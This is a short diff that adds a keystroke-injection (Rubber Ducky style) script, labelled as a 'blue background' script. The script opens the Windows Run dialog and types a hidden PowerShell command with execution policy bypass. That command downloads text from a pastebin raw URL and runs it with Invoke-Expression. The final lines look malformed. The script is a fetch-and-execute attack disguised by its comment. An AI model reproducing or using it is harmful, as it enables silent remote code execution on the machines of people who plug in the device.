@@ -1,0 +1,9 @@
+REM blue background
+DELAY 100
+GUI r
+DELAY 100
+STRING powershell -W Hidden -Exec Bypass $a = Invoke-WebRequest https://pastebin.com/raw/gegpAJ3s; Invoke-Expression $a
+DELAY 300
+ENTER powershell -W
+DELAY 5000
+STRING F
